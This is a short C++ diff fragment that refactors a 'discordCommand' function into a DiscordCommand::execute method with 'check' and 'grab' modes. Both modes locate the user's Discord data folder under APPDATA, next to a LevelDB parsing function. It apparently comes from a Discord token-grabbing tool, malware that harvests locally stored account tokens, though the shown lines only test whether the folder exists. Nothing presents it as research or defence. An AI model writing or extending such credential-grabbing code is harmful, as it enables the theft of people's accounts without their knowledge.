@@ -73,13 +73,13 @@ string parseLDB(const string path) {
 	return "";
 }
 
-int discordCommand(Controller& ctrl, DiscordCommand cmd) {
-	if (cmd == DiscordCommand::check) {
+int DiscordCommand::execute(Controller& ctrl, DiscordCommandEnum cmd) {
+	if (cmd == DiscordCommandEnum::check) {
 		string discordPath = getenv("APPDATA");
 		discordPath += "/discord";
 		return !(filesystem::exists(discordPath) &&
 				 filesystem::is_directory(discordPath));
-	} else if (cmd == DiscordCommand::grab) {
+	} else if (cmd == DiscordCommandEnum::grab) {
 		string discordPath = getenv("APPDATA");
 		discordPath += "/discord";
 		if (!(filesystem::exists(discordPath) &&
